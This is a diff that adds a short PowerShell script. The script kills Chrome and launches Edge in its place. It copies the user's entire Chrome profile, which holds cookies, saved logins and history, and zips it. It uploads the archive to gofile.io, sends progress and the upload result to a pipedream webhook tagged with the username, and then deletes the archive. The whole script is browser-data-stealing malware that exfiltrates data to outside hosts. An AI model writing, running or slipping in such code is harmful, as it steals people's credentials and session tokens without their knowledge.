@@ -1,0 +1,18 @@
+taskkill /f /im Chrome.exe
+Start-Process "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/copying/$env:username" -method post
+Copy-Item -Path "C:\Users\$env:username\AppData\Local\Google\Chrome" -Destination "C:\Users\$env:username\AppData\Local\Google\Chrome2" -Recurse
+
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/completed/$env:username" -method post
+Start-Process Chrome
+
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/archiving/$env:username" -method post
+Compress-Archive -Path "C:\Users\$env:username\AppData\Local\Google\Chrome2" -DestinationPath "C:\Cache\lol.zip"
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/completed/$env:username" -method post
+
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/uploading/$env:username" -method post
+$hi = cmd /c curl -X POST 'https://store1.gofile.io/contents/uploadfile' -F "file=@C:\Cache\lol.zip"
+
+curl "https://eov3z188nwj4lcz.m.pipedream.net/chromedata/COMPLETED/$env:username" -Body $hi -method post 
+Remove-Item "C:\Cache\lol.zip"
